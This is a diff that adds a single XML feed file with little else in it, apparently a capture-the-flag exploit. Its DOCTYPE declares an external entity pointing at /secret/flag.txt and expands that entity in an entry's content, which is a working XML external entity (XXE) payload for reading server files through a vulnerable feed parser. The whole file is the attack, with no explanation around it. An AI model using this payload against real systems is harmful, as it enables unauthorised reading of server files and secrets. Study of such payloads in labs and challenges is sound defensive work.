@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE feed [
+<!ENTITY xxe SYSTEM "/secret/flag.txt">
+]>
+<feed>
+    <title>test</title>
+    <description>test</description>
+    
+    <entry>
+      <title>Hello</title>
+      <link href="http://example.com"></link>
+      <content>&xxe;</content>
+    </entry>
+    
+</feed>
